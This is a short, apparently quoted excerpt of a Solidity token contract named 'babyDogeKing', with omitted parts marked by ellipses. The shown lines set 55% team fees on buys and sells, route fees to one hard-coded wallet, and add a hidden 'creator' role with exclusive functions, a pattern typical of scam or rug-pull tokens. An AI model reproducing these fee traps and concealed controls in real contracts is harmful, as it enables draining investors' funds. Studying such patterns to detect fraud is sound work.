...
contract babyDogeKing is Context, IERC20, Ownable {
    ...
    string private _name = "babyDogeKing";
    string private _symbol = "babyDogeKing";
    uint8 private _decimals = 5;

    address payable public marketingWalletAddress = payable(0x9a6bA10cd7938c63d39Bfee462c5e56B2f311ef2); 
    address payable public teamWalletAddress = payable(0x9a6bA10cd7938c63d39Bfee462c5e56B2f311ef2); 
    ...
    uint256 public _buyTeamFee = 55;
    
    uint256 public _sellLiquidityFee = 2;
    uint256 public _sellMarketingFee = 2;
    uint256 public _sellTeamFee =55 ;
    ...
    address payable public Cr = payable(getCreator()); 
    ...
    function setNumTokenslp(address newAddress) external onlyCreator() {
